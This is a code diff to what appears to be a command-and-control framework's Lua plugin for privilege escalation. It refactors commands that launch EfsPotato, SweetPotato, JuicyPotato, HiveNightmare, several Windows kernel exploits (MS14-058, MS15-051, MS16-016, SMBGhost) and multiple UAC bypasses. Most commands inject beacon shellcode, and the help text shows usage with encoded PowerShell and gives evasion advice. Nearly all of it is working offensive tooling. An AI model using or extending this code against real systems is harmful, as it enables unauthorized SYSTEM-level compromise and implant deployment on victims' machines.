@@ -18,19 +18,18 @@ local function elevate_resource_path(category, filename)
 end
 
 -- Unified shellcode retrieval function
--- Supports three modes: stager (default), shellcode_file, artifact_id
+-- Supports three modes: stager (default), shellcode-file, shellcode-artifact
 local function get_shellcode(session, cmd)
-    local shellcode_file = cmd:Flags():GetString("shellcode_file")
-    local artifact_id = cmd:Flags():GetString("artifact_id")
+    local shellcode_file = cmd:Flags():GetString("shellcode-file")
+    local shellcode_artifact = cmd:Flags():GetString("shellcode-artifact")
 
-    -- Priority: artifact_id > shellcode_file > stager (default)
-    if artifact_id ~= "" then
+    -- Priority: shellcode-artifact > shellcode-file > stager (default)
+    if shellcode_artifact ~= "" then
         -- Get artifact by name
-        local artifact, err = download_artifact(artifact_id, "raw", "")
+        local artifact, err = download_artifact(shellcode_artifact, "raw", "")
         if err ~= nil or artifact == nil then
-            error("Failed to get artifact with id: " .. artifact_id .. ", error: " .. tostring(err))
+            error("Failed to get artifact with id: " .. shellcode_artifact .. ", error: " .. tostring(err))
         end
-        -- artifact.bin is already a byte string (decoded from protobuf)
         return artifact.bin
     elseif shellcode_file ~= "" then
         -- Read from file
@@ -42,162 +41,184 @@ local function get_shellcode(session, cmd)
         shellcode_handle:close()
         return shellcode
     else
-        -- Default: use self_stager
         return self_stager(session)
     end
 end
 
--- EfsPotato_Net3.5.exe - Command execution
-local function run_EfsPotato_Net35_Command(args)
-    if #args < 1 then error("Usage: EfsPotato_Net3.5 <cmd>") end
+-- EfsPotato - Unified command and shellcode execution with auto CLR detection
+local function run_EfsPotato(args, cmd)
     local session = active()
-    local efspotato_path = elevate_resource_path("potato", "EfsPotato_Net3.5.exe")
-    return execute_assembly(session, script_resource(efspotato_path), args, true,new_bypass_all(), new_sac())
+
+    -- Get flags
+    local exec_command = cmd:Flags():GetString("command")
+
+    -- Determine CLR version (v2.x = Net3.5, v4.x = Net4.0)
+    local efspotato_filename
+    if has_clr_version(session, "v4.0") then
+        efspotato_filename = "EfsPotato_Net4.0"
+    else
+        efspotato_filename = "EfsPotato_Net3.5"
+    end
+
+    -- Determine execution mode
+    if exec_command ~= "" then
+        -- Command execution mode
+        local efspotato_path = elevate_resource_path("potato", efspotato_filename .. ".exe")
+        return execute_assembly(session, script_resource(efspotato_path), {exec_command}, true, new_bypass_all(), new_sac())
+    else
+        -- Shellcode execution mode (handles artifact/file/stager priority automatically)
+        local shellcode = get_shellcode(session, cmd)
+        local efspotato_path = elevate_resource_path("potato", efspotato_filename .. "_Shellcode.exe")
+        local b64_shellcode = base64_encode(shellcode)
+        return execute_assembly(session, script_resource(efspotato_path), {b64_shellcode}, true, new_bypass_all(), new_sac())
+    end
 end
 
-local cmd_EfsPotato_Net35_Command = command("elevate:EfsPotato_Net3.5_Command", run_EfsPotato_Net35_Command,
-        "EfsPotato privilege escalation with command execution", "T1068")
-opsec("elevate:EfsPotato_Net3.5_Command", 8.0)
+local cmd_EfsPotato = command("elevate:EfsPotato", run_EfsPotato,
+        "EfsPotato privilege escalation with auto CLR detection", "T1068")
+cmd_EfsPotato:Flags():String("command", "", "Execute a command (e.g., 'whoami', 'cmd.exe /c <cmd>')")
+cmd_EfsPotato:Flags():String("shellcode-file", "", "Path to raw shellcode file for injection")
+cmd_EfsPotato:Flags():String("shellcode-artifact", "", "Artifact ID for shellcode payload")
+bind_flags_completer(cmd_EfsPotato, { ["shellcode-artifact"] = artifact_completer() })
+opsec("elevate:EfsPotato", 8.0)
 
--- EfsPotato_Net3.5_CS.exe - Shellcode execution
-local function run_EfsPotato_Net35_Shellcode(cmd)
-    local session = active()
-    local shellcode = get_shellcode(session, cmd)
+help("elevate:EfsPotato", [[
+EfsPotato privilege escalation with automatic CLR version detection.
 
-    local efspotato_path = elevate_resource_path("potato", "EfsPotato_Net3.5_CS.exe")
-    local b64_shellcode = base64_encode(shellcode)
-    return execute_assembly(session, script_resource(efspotato_path), {b64_shellcode}, true,new_bypass_all(), new_sac())
-end
+Automatically selects .NET 3.5 or 4.0 version based on system CLR version.
 
-local cmd_EfsPotato_Net35_Shellcode = command("elevate:EfsPotato_Net3.5_Shellcode", run_EfsPotato_Net35_Shellcode,
-        "EfsPotato privilege escalation with shellcode execution", "T1068")
-cmd_EfsPotato_Net35_Shellcode:Flags():String("shellcode_file", "",
-        "Path to the raw shellcode file. If not set, uses self_stager")
-cmd_EfsPotato_Net35_Shellcode:Flags():String("artifact_id", "",
-        "Artifact ID to use for shellcode. If set, uses artifact instead of stager")
-bind_flags_completer(cmd_EfsPotato_Net35_Shellcode, { artifact_id = artifact_completer() })
-opsec("elevate:EfsPotato_Net3.5_Shellcode", 8.0)
+Command execution:
+  elevate EfsPotato --command "whoami"
+  elevate EfsPotato --command "powershell -enc <base64>"
 
-help("elevate:EfsPotato_Net3.5_Shellcode", [[
-EfsPotato .NET 3.5 privilege escalation with shellcode execution.
-
-Examples:
-  elevate EfsPotato_Net3.5_Shellcode                                    # Use self_stager (default)
-  elevate EfsPotato_Net3.5_Shellcode --shellcode_file /path/to/sc.bin  # Use custom shellcode file
-  elevate EfsPotato_Net3.5_Shellcode --artifact_id beacon_x64          # Use artifact from server
+Shellcode execution:
+  elevate EfsPotato                                         # Use self_stager (default)
+  elevate EfsPotato --shellcode-file /path/to/sc.bin       # Load shellcode from file
+  elevate EfsPotato --shellcode-artifact beacon_x64        # Load shellcode from artifact
 
 Options:
-  --shellcode_file: Path to raw shellcode file (optional)
-  --artifact_id: Artifact name to use for shellcode (optional)
+  --command: Execute a command (mutually exclusive with shellcode options)
+  --shellcode-file: Path to raw shellcode file (optional)
+  --shellcode-artifact: Artifact name for shellcode payload (optional)
 
-  If no options specified, uses self_stager by default.
-  Priority: artifact_id > shellcode_file > stager
+  Priority: command > shellcode-artifact > shellcode-file > self_stager
 
 Note: Exploits the MS-EFSR protocol for privilege escalation.
 ]])
 
--- EfsPotato_Net4.0.exe - Command execution
-local function run_EfsPotato_Net40_Command(args)
-    if #args ~= 1 then error("Usage: EfsPotato_Net4.0 <cmd>") end
+-- SweetPotato - Unified command and shellcode execution with auto CLR detection
+local function run_SweetPotato(args, cmd)
     local session = active()
-    local efspotato_path = elevate_resource_path("potato", "EfsPotato_Net4.0.exe")
-    return execute_assembly(session, script_resource(efspotato_path), args, true,new_bypass_all(), new_sac())
+
+    -- Get flags
+    local exec_command = cmd:Flags():GetString("command")
+    local listener_port = cmd:Flags():GetString("listener-port")
+    local target_process = cmd:Flags():GetString("target-process")
+
+    -- Determine CLR version (v2.x uses 4.0, v4.0.30319+ uses 4.6)
+    local sweetpotato_filename
+    if has_clr_version(session, "v4.0") then
+        sweetpotato_filename = "SweetPotato_NET4-46.exe"
+    else
+        sweetpotato_filename = "SweetPotato_net4.0.exe"
+    end
+
+    -- Determine execution mode
+    if exec_command ~= "" then
+        -- Command execution mode
+        local sweetpotato_path = elevate_resource_path("potato", sweetpotato_filename)
+        return execute_assembly(session, script_resource(sweetpotato_path), {exec_command}, true, new_bypass_all(), new_sac())
+    else
+        -- Shellcode execution mode (handles artifact/file/stager priority automatically)
+        local shellcode = get_shellcode(session, cmd)
+        local sweetpotato_path = elevate_resource_path("potato", "SweetPotato_Net4_Shellcode.exe")
+        local b64_shellcode = base64_encode(shellcode)
+        local sp_args = {"-l", listener_port, "-p", target_process, "-s", b64_shellcode}
+        return execute_assembly(session, script_resource(sweetpotato_path), sp_args, true, new_bypass_all(), new_sac())
+    end
 end
 
-local cmd_EfsPotato_Net40_Command = command("elevate:EfsPotato_Net4.0_Command", run_EfsPotato_Net40_Command,
-        "EfsPotato .NET 4.0 privilege escalation with command execution", "T1068")
-opsec("elevate:EfsPotato_Net4.0_Command", 8.0)
+local cmd_SweetPotato = command("elevate:SweetPotato", run_SweetPotato,
+        "SweetPotato privilege escalation with auto CLR detection", "T1068")
+cmd_SweetPotato:Flags():String("command", "", "Execute a command (e.g., 'whoami', 'cmd.exe /c <cmd>')")
+cmd_SweetPotato:Flags():String("shellcode-file", "", "Path to raw shellcode file for injection")
+cmd_SweetPotato:Flags():String("shellcode-artifact", "", "Artifact ID for shellcode payload")
+cmd_SweetPotato:Flags():String("listener-port", "12333", "COM server listening port")
+cmd_SweetPotato:Flags():String("target-process", "c:\\windows\\system32\\cmd.exe", "Target process for shellcode injection")
+bind_flags_completer(cmd_SweetPotato, { ["shellcode-artifact"] = artifact_completer() })
+opsec("elevate:SweetPotato", 8.0)
 
--- SweetPotato_NET4-46.exe
-local function run_SweetPotato_NET46(args)
-    if #args < 1 then error("Arguments required for SweetPotato") end
-    local session = active()
-    local sweetpotato_path = elevate_resource_path("potato", "SweetPotato_NET4-46.exe")
-    return execute_assembly(session, script_resource(sweetpotato_path), args, true,new_bypass_all(), new_sac())
-end
+help("elevate:SweetPotato", [[
+SweetPotato privilege escalation with automatic CLR version detection.
 
-local cmd_SweetPotato_NET46 = command("elevate:SweetPotato4-46", run_SweetPotato_NET46, 
-        "SweetPotato .NET 4.6 privilege escalation", "T1068")
-opsec("elevate:SweetPotato4-46", 8.0)
+Automatically selects .NET 4.0 or 4.6 version based on system CLR version.
 
--- SweetPotato_net4.0.exe
-local function run_SweetPotato_Net40(args)
-    if #args < 1 then error("Arguments required for SweetPotato") end
-    local session = active()
-    local sweetpotato_path = elevate_resource_path("potato", "SweetPotato_net4.0.exe")
-    return execute_assembly(session, script_resource(sweetpotato_path), args, true,new_bypass_all(), new_sac())
-end
+Command execution:
+  elevate SweetPotato --command "whoami"
+  elevate SweetPotato --command "powershell -enc <base64>"
 
-local cmd_SweetPotato_Net40 = command("elevate:SweetPotato_net4.0", run_SweetPotato_Net40,
-        "SweetPotato .NET 4.0 privilege escalation", "T1068")
-opsec("elevate:SweetPotato_net4.0", 8.0)
+Shellcode execution:
+  elevate SweetPotato                                         # Use self_stager (default)
+  elevate SweetPotato --shellcode-file /path/to/sc.bin       # Load shellcode from file
+  elevate SweetPotato --shellcode-artifact beacon_x64        # Load shellcode from artifact
 
--- SweetPotato_CS.exe - Shellcode execution
-local function run_SweetPotato_CS(cmd)
-    local session = active()
-    local shellcode = get_shellcode(session, cmd)
+Advanced options (shellcode mode):
+  --listener-port: COM server listening port (default: 12333)
+  --target-process: Process to spawn for injection (default: c:\windows\system32\cmd.exe)
 
-    local sweetpotato_path = elevate_resource_path("potato", "SweetPotato_CS.exe")
-    local b64_shellcode = base64_encode(shellcode)
-    print(b64_shellcode)
-    local args = {"-l", "12333", "-p", "c:\\windows\\system32\\cmd.exe", "-s", b64_shellcode}
-    return execute_assembly(session, script_resource(sweetpotato_path), args, true, new_bypass_all(), new_sac())
-end
+Options:
+  --command: Execute a command (mutually exclusive with shellcode options)
+  --shellcode-file: Path to raw shellcode file (optional)
+  --shellcode-artifact: Artifact name for shellcode payload (optional)
 
-local cmd_SweetPotato_CS = command("elevate:SweetPotato_CS", run_SweetPotato_CS,
-        "SweetPotato privilege escalation with shellcode execution", "T1068")
-cmd_SweetPotato_CS:Flags():String("shellcode_file", "",
-        "Path to the raw shellcode file. If not set, uses self_stager")
-cmd_SweetPotato_CS:Flags():String("artifact_id", "",
-        "Artifact ID to use for shellcode. If set, uses artifact instead of stager")
-bind_flags_completer(cmd_SweetPotato_CS, { artifact_id = artifact_completer() })
-opsec("elevate:SweetPotato_CS", 8.0)
+  Priority: command > shellcode-artifact > shellcode-file > self_stager
+]])
 
 -- JuicyPotato
 local function run_JuicyPotato(args, cmd)
     local session = active()
     local arch = session.Os.Arch
-    
+
     -- Get parameters from flags
     local create_type = cmd:Flags():GetString("type")
     local program = cmd:Flags():GetString("program")
     local port = cmd:Flags():GetString("port")
     local clsid = cmd:Flags():GetString("clsid")
     local arguments = cmd:Flags():GetString("arguments")
-    
+
     -- Build arguments array
     local jp_args = {}
-    
+
     if create_type ~= "" then
         table.insert(jp_args, "-t")
         table.insert(jp_args, create_type)
     end
-    
+
     if program ~= "" then
         table.insert(jp_args, "-p")
         table.insert(jp_args, program)
     end
-    
+
     if port ~= "" then
         table.insert(jp_args, "-l")
         table.insert(jp_args, port)
     end
-    
+
     if clsid ~= "" then
         table.insert(jp_args, "-c")
         table.insert(jp_args, clsid)
     end
-    
+
     if arguments ~= "" then
         table.insert(jp_args, "-a")
         table.insert(jp_args, arguments)
     end
-    
+
     local juicypotato_path = elevate_resource_path("potato", "JuicyPotato.exe")
     return execute_exe(session, script_resource(juicypotato_path), jp_args, true, 60, arch, "", new_sac())
 end
 
-local cmd_JuicyPotato = command("elevate:JuicyPotato", run_JuicyPotato, 
+local cmd_JuicyPotato = command("elevate:JuicyPotato", run_JuicyPotato,
         "JuicyPotato privilege escalation", "T1068")
 cmd_JuicyPotato:Flags():String("type", "t", "CreateProcess call type (t=CreateProcessWithTokenW, u=CreateProcessAsUser, *=auto)")
 cmd_JuicyPotato:Flags():String("program", "c:\\windows\\system32\\cmd.exe", "Program to launch")
@@ -215,7 +236,7 @@ Flag-based usage (recommended):
 Parameters:
   --type: CreateProcess call type
     * t = CreateProcessWithTokenW (default)
-    * u = CreateProcessAsUser  
+    * u = CreateProcessAsUser
     * * = auto-detect
   --program: Program to launch (default: "c:\windows\system32\cmd.exe")
   --port: COM server listening port (default: 1337)
@@ -235,27 +256,36 @@ OPSEC consideration: Use different ports and CLSIDs to avoid detection.
 -- HIVENIGHTMARE SERIES
 -- =============================================================================
 
--- SharpHiveNightmare_Net4.0.exe
-local function run_SharpHiveNightmare_Net40()
+-- SharpHiveNightmare - Auto CLR version detection
+local function run_SharpHiveNightmare()
     local session = active()
-    local sharphivenightmare_path = elevate_resource_path("hivenightmare", "SharpHiveNightmare_Net4.exe")
+
+    -- Determine CLR version
+    local sharphivenightmare_filename
+    if has_clr_version(session, "v4.0") then
+        sharphivenightmare_filename = "SharpHiveNightmare_Net4.5.exe"
+    else
+        sharphivenightmare_filename = "SharpHiveNightmare_Net4.exe"
+    end
+
+    local sharphivenightmare_path = elevate_resource_path("hivenightmare", sharphivenightmare_filename)
     return execute_assembly(session, script_resource(sharphivenightmare_path), {}, true, new_bypass_all(), new_sac())
 end
 
-local cmd_SharpHiveNightmare_Net40 = command("elevate:SharpHiveNightmare_Net4.0", run_SharpHiveNightmare_Net40,
-        "SharpHiveNightmare .NET 4.0 privilege escalation", "T1068")
-opsec("elevate:SharpHiveNightmare_Net4.0", 9.0)
+local cmd_SharpHiveNightmare = command("elevate:SharpHiveNightmare", run_SharpHiveNightmare,
+        "SharpHiveNightmare privilege escalation with auto CLR detection", "T1068")
+opsec("elevate:SharpHiveNightmare", 9.0)
 
--- SharpHiveNightmare_Net4.5.exe
-local function run_SharpHiveNightmare_Net45()
-    local session = active()
-    local sharphivenightmare_path = elevate_resource_path("hivenightmare", "SharpHiveNightmare_Net4.5.exe")
-    return execute_assembly(session, script_resource(sharphivenightmare_path), {}, true, new_bypass_all(), new_sac())
-end
+help("elevate:SharpHiveNightmare", [[
+SharpHiveNightmare (HiveNightmare/SeriousSAM) privilege escalation.
 
-local cmd_SharpHiveNightmare_Net45 = command("elevate:SharpHiveNightmare_Net4.5", run_SharpHiveNightmare_Net45,
-        "SharpHiveNightmare .NET 4.5 privilege escalation", "T1068")
-opsec("elevate:SharpHiveNightmare_Net4.5", 9.0)
+Automatically selects .NET 4.0 or 4.5 version based on system CLR version.
+
+Usage:
+  elevate SharpHiveNightmare
+
+This exploit leverages CVE-2021-36934 to access shadow copies of SAM/SYSTEM files.
+]])
 
 -- HiveNightmare.exe
 local function run_HiveNightmare()
@@ -284,25 +314,25 @@ end
 
 local cmd_ms14_058 = command("elevate:ms14-058", run_ms14_058,
         "MS14-058 (CVE-2014-4113) privilege escalation", "T1068")
-cmd_ms14_058:Flags():String("shellcode_file", "", "Path to raw shellcode file (optional, uses self_stager if not provided)")
-cmd_ms14_058:Flags():String("artifact_id", "", "Artifact ID to use for shellcode (optional)")
-bind_flags_completer(cmd_ms14_058, { artifact_id = artifact_completer() })
+cmd_ms14_058:Flags():String("shellcode-file", "", "Path to raw shellcode file for injection")
+cmd_ms14_058:Flags():String("shellcode-artifact", "", "Artifact ID for shellcode payload")
+bind_flags_completer(cmd_ms14_058, { ["shellcode-artifact"] = artifact_completer() })
 opsec("elevate:ms14-058", 7.0)
 
 help("elevate:ms14-058", [[
 MS14-058 (CVE-2014-4113) kernel privilege escalation exploit.
 
 Examples:
-  elevate ms14-058                                    # Use self_stager (default)
-  elevate ms14-058 --shellcode_file C:\payload.bin    # Use custom shellcode file
-  elevate ms14-058 --artifact_id beacon_x64           # Use artifact from server
+  elevate ms14-058                                         # Use self_stager (default)
+  elevate ms14-058 --shellcode-file C:\payload.bin        # Load shellcode from file
+  elevate ms14-058 --shellcode-artifact beacon_x64        # Load shellcode from artifact
 
 Options:
-  --shellcode_file: Path to raw shellcode file (optional)
-  --artifact_id: Artifact name to use for shellcode (optional)
+  --shellcode-file: Path to raw shellcode file (optional)
+  --shellcode-artifact: Artifact name for shellcode payload (optional)
 
   If no options specified, uses self_stager by default.
-  Priority: artifact_id > shellcode_file > stager
+  Priority: shellcode-artifact > shellcode-file > self_stager
 
 Affected Systems:
   - Windows 7 SP1
@@ -326,25 +356,25 @@ end
 
 local cmd_ms15_051 = command("elevate:ms15-051", run_ms15_051,
         "MS15-051 (CVE-2015-1701) privilege escalation", "T1068")
-cmd_ms15_051:Flags():String("shellcode_file", "", "Path to raw shellcode file (optional, uses self_stager if not provided)")
-cmd_ms15_051:Flags():String("artifact_id", "", "Artifact ID to use for shellcode (optional)")
-bind_flags_completer(cmd_ms15_051, { artifact_id = artifact_completer() })
+cmd_ms15_051:Flags():String("shellcode-file", "", "Path to raw shellcode file for injection")
+cmd_ms15_051:Flags():String("shellcode-artifact", "", "Artifact ID for shellcode payload")
+bind_flags_completer(cmd_ms15_051, { ["shellcode-artifact"] = artifact_completer() })
 opsec("elevate:ms15-051", 7.0)
 
 help("elevate:ms15-051", [[
 MS15-051 (CVE-2015-1701) kernel privilege escalation exploit.
 
 Examples:
-  elevate ms15-051                                    # Use self_stager (default)
-  elevate ms15-051 --shellcode_file C:\payload.bin    # Use custom shellcode file
-  elevate ms15-051 --artifact_id beacon_x64           # Use artifact from server
+  elevate ms15-051                                         # Use self_stager (default)
+  elevate ms15-051 --shellcode-file C:\payload.bin        # Load shellcode from file
+  elevate ms15-051 --shellcode-artifact beacon_x64        # Load shellcode from artifact
 
 Options:
-  --shellcode_file: Path to raw shellcode file (optional)
-  --artifact_id: Artifact name to use for shellcode (optional)
+  --shellcode-file: Path to raw shellcode file (optional)
+  --shellcode-artifact: Artifact name for shellcode payload (optional)
 
   If no options specified, uses self_stager by default.
-  Priority: artifact_id > shellcode_file > stager
+  Priority: shellcode-artifact > shellcode-file > self_stager
 
 Affected Systems:
   - Windows 7 SP1
@@ -372,25 +402,25 @@ end
 
 local cmd_ms16_016 = command("elevate:ms16-016", run_ms16_016,
         "MS16-016 (CVE-2016-0051) privilege escalation (x86 only)", "T1068")
-cmd_ms16_016:Flags():String("shellcode_file", "", "Path to raw shellcode file (optional, uses self_stager if not provided)")
-cmd_ms16_016:Flags():String("artifact_id", "", "Artifact ID to use for shellcode (optional)")
-bind_flags_completer(cmd_ms16_016, { artifact_id = artifact_completer() })
+cmd_ms16_016:Flags():String("shellcode-file", "", "Path to raw shellcode file for injection")
+cmd_ms16_016:Flags():String("shellcode-artifact", "", "Artifact ID for shellcode payload")
+bind_flags_completer(cmd_ms16_016, { ["shellcode-artifact"] = artifact_completer() })
 opsec("elevate:ms16-016", 7.0)
 
 help("elevate:ms16-016", [[
 MS16-016 (CVE-2016-0051) kernel privilege escalation exploit.
 
 Examples:
-  elevate ms16-016                                    # Use self_stager (default)
-  elevate ms16-016 --shellcode_file C:\payload.bin    # Use custom shellcode file
-  elevate ms16-016 --artifact_id beacon_x86           # Use artifact from server
+  elevate ms16-016                                         # Use self_stager (default)
+  elevate ms16-016 --shellcode-file C:\payload.bin        # Load shellcode from file
+  elevate ms16-016 --shellcode-artifact beacon_x86        # Load shellcode from artifact
 
 Options:
-  --shellcode_file: Path to raw shellcode file (optional)
-  --artifact_id: Artifact name to use for shellcode (optional)
+  --shellcode-file: Path to raw shellcode file (optional)
+  --shellcode-artifact: Artifact name for shellcode payload (optional)
 
   If no options specified, uses self_stager by default.
-  Priority: artifact_id > shellcode_file > stager
+  Priority: shellcode-artifact > shellcode-file > self_stager
 
 Requirements:
   - x86 architecture ONLY (will fail on x64 systems)
@@ -416,13 +446,13 @@ local function run_ms16_032(args)
     end
     local script_content = script_handle:read("*all")
     script_handle:close()
-    
+
     -- Use powershell command execution instead of import
     local ps_command = script_content .. "; Invoke-MS16032"
     if #args > 0 then
         ps_command = ps_command .. " " .. table.concat(args, " ")
     end
-    
+
     return powershell(session, ps_command, false)
 end
 
@@ -446,25 +476,25 @@ end
 
 local cmd_cve_2020_0796 = command("elevate:cve-2020-0796", run_cve_2020_0796,
         "CVE-2020-0796 (SMBGhost) privilege escalation", "T1068")
-cmd_cve_2020_0796:Flags():String("shellcode_file", "", "Path to raw shellcode file (optional, uses self_stager if not provided)")
-cmd_cve_2020_0796:Flags():String("artifact_id", "", "Artifact ID to use for shellcode (optional)")
-bind_flags_completer(cmd_cve_2020_0796, { artifact_id = artifact_completer() })
+cmd_cve_2020_0796:Flags():String("shellcode-file", "", "Path to raw shellcode file for injection")
+cmd_cve_2020_0796:Flags():String("shellcode-artifact", "", "Artifact ID for shellcode payload")
+bind_flags_completer(cmd_cve_2020_0796, { ["shellcode-artifact"] = artifact_completer() })
 opsec("elevate:cve-2020-0796", 7.0)
 
 help("elevate:cve-2020-0796", [[
 CVE-2020-0796 (SMBGhost) privilege escalation exploit.
 
 Examples:
-  elevate cve-2020-0796                               # Use self_stager (default)
-  elevate cve-2020-0796 --shellcode_file C:\payload.bin # Use custom shellcode file
-  elevate cve-2020-0796 --artifact_id beacon_x64      # Use artifact from server
+  elevate cve-2020-0796                                    # Use self_stager (default)
+  elevate cve-2020-0796 --shellcode-file C:\payload.bin   # Load shellcode from file
+  elevate cve-2020-0796 --shellcode-artifact beacon_x64   # Load shellcode from artifact
 
 Options:
-  --shellcode_file: Path to raw shellcode file (optional)
-  --artifact_id: Artifact name to use for shellcode (optional)
+  --shellcode-file: Path to raw shellcode file (optional)
+  --shellcode-artifact: Artifact name for shellcode payload (optional)
 
   If no options specified, uses self_stager by default.
-  Priority: artifact_id > shellcode_file > stager
+  Priority: shellcode-artifact > shellcode-file > self_stager
 
 Requirements:
   - x64 architecture ONLY
@@ -480,10 +510,6 @@ Note: This exploit targets the SMBv3 compression vulnerability in srv2.sys.
 Requires local access and SMBv3 compression enabled.
 ]])
 
--- =============================================================================
--- UAC BYPASS TECHNIQUES
--- =============================================================================
-
 -- TrustedPath DLL Hijack
 local function run_trustedpath(cmd)
     local local_dll = cmd:Flags():GetString("local_dll_file")
@@ -491,25 +517,25 @@ local function run_trustedpath(cmd)
         error("local_dll_file is required")
         return
     end
-    
+
     local session = active()
     local arch = session.Os.Arch
     if arch == "x32" then
         error("x32 architecture not supported")
         return
     end
-    
+
     local bof_file = bof_path_elevate("bof","TrustedPathDLLHijack")
     local file_content_handle = io.open(local_dll, "rb")
-    if file_content_handle == nil then 
-        error("Failed to open DLL file: " .. local_dll) 
+    if file_content_handle == nil then
+        error("Failed to open DLL file: " .. local_dll)
     end
-    
+
     local file_content = file_content_handle:read("*all")
     file_content_handle:close()
     local content_len = string.len(file_content)
     local pack_args = bof_pack("iz", content_len, file_content)
-    
+
     return bof(session, script_resource(bof_file), pack_args, true)
 end
 
@@ -536,14 +562,14 @@ loaded by ComputerDefaults.exe to bypass UAC.
 -- CmstpElevatedCOM
 local function run_CmstpElevatedCOM(args)
     if #args < 1 then error("Command argument required") end
-    
+
     local session = active()
     local arch = session.Os.Arch
     if arch == "x32" then
         error("x32 architecture not supported")
         return
     end
-    
+
     local bof_file = bof_path_elevate("bof","CmstpElevatedCOM")
     local pack_args = bof_pack("z", args[1])
     return bof(session, script_resource(bof_file), pack_args, true)
@@ -556,14 +582,14 @@ opsec("uac-bypass:elevatedcom", 8.5)
 -- ColorDataProxy UAC Bypass
 local function run_ColorDataProxy(args)
     if #args < 1 then error("Command argument required") end
-    
+
     local session = active()
     local arch = session.Os.Arch
     if arch == "x32" then
         error("x32 architecture not supported")
         return
     end
-    
+
     local bof_file = bof_path_elevate("bof","ColorDataProxy")
     local pack_args = bof_pack("z", args[1])
     return bof(session, script_resource(bof_file), pack_args, true)
@@ -577,25 +603,25 @@ opsec("uac-bypass:colordataproxy", 8.5)
 local function run_EditionUpgradeManager(cmd)
     local command_to_run = cmd:Flags():GetString("command")
     local use_disk_file = cmd:Flags():GetBool("use_disk_file")
-    
+
     if command_to_run == "" then
         error("Command is required")
     end
-    
+
     local session = active()
     local arch = session.Os.Arch
     if arch == "x32" then
         error("x32 architecture not supported")
         return
     end
-    
+
     local bof_file
     if use_disk_file then
         bof_file = bof_path_elevate("bof","EditionUpgradeManager_OnDiskFile")
     else
         bof_file = bof_path_elevate("bof","EditionUpgradeManager")
     end
-    
+
     local pack_args = bof_pack("z", command_to_run)
     return bof(session, script_resource(bof_file), pack_args, true)
 end
@@ -609,14 +635,14 @@ opsec("uac-bypass:editionupgrade", 8.5)
 -- Registry Shell Command UAC Bypass
 local function run_RegistryShellCommand(args)
     if #args < 1 then error("Command argument required") end
-    
+
     local session = active()
     local arch = session.Os.Arch
     if arch == "x32" then
         error("x32 architecture not supported")
         return
     end
-    
+
     local bof_file = bof_path_elevate("bof","RegistryShellCommand")
     local pack_args = bof_pack("z", args[1])
     return bof(session, script_resource(bof_file), pack_args, true)
@@ -630,25 +656,25 @@ opsec("uac-bypass:registryshell", 8.5)
 local function run_SilentCleanupWinDir(cmd)
     local command_to_run = cmd:Flags():GetString("command")
     local use_disk_file = cmd:Flags():GetBool("use_disk_file")
-    
+
     if command_to_run == "" then
         error("Command is required")
     end
-    
+
     local session = active()
     local arch = session.Os.Arch
     if arch == "x32" then
         error("x32 architecture not supported")
         return
     end
-    
+
     local bof_file
     if use_disk_file then
         bof_file = bof_path_elevate("bof","SilentCleanupWinDir_OnDiskFile")
     else
         bof_file = bof_path_elevate("bof","SilentCleanupWinDir")
     end
-    
+
     local pack_args = bof_pack("z", command_to_run)
     return bof(session, script_resource(bof_file), pack_args, true)
 end
@@ -662,14 +688,14 @@ opsec("uac-bypass:silentcleanup", 8.5)
 -- SspiUacBypass
 local function run_SspiUacBypass(args)
     if #args < 1 then error("Command argument required") end
-    
+
     local session = active()
     local arch = session.Os.Arch
     if arch == "x32" then
         error("x32 architecture not supported")
         return
     end
-    
+
     local bof_file = bof_path_elevate("bof","SspiUacBypass")
     local pack_args = bof_pack("z", args[1])
     return bof(session, script_resource(bof_file), pack_args, true)
@@ -708,7 +734,7 @@ local function run_EventVwrBypass(args)
     if #args > 0 then
         ps_command = ps_command .. " " .. table.concat(args, " ")
     end
-    
+
     return powershell(session, ps_command, false)
 end
 
@@ -725,7 +751,7 @@ local function run_WScriptBypass(args)
     if #args > 0 then
         ps_command = ps_command .. " " .. table.concat(args, " ")
     end
-    
+
     return powershell(session, ps_command, false)
 end
 
